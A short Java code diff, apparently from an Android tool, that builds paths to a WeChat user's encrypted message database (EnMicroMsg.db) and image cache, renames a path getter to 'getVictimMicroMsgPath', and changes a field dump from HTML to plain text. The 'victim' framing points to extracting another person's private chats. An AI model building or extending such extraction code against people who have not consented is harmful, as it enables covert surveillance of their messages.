@@ -41,7 +41,7 @@ public class User extends Account {
     public User(String uin) {
         this.uin = uin;
         String pathIdentifier = DigestUtils.md5Hex("mm" + uin);
-        this.dirPath = Environment.getInstance().getWechatMicroMsgPath() + File.separator + pathIdentifier;
+        this.dirPath = Environment.getInstance().getVictimMicroMsgPath() + File.separator + pathIdentifier;
         this.originalDatabaseFilePath = dirPath + File.separator + "EnMicroMsg.db";
         this.imageCachePath = android.os.Environment.getExternalStorageDirectory().getPath() + File.separator + "tencent"
                 + File.separator + "MicroMsg" + File.separator + pathIdentifier + File.separator + "image2";
@@ -80,8 +80,8 @@ public class User extends Account {
             for (Field field : fields) {
                 if (field.getGenericType() == String.class) {
                     String str = (String) field.get(this);
-                    str = str == null ? "<i>null</i>" : str;
-                    output.append("<b>").append(field.getName()).append("</b>").append(": ").append(str).append("<br/>");
+                    str = str == null ? "<null>" : str;
+                    output.append(field.getName()).append(": ").append(str).append("\n");
                 }
             }
         } catch (IllegalAccessException e) {
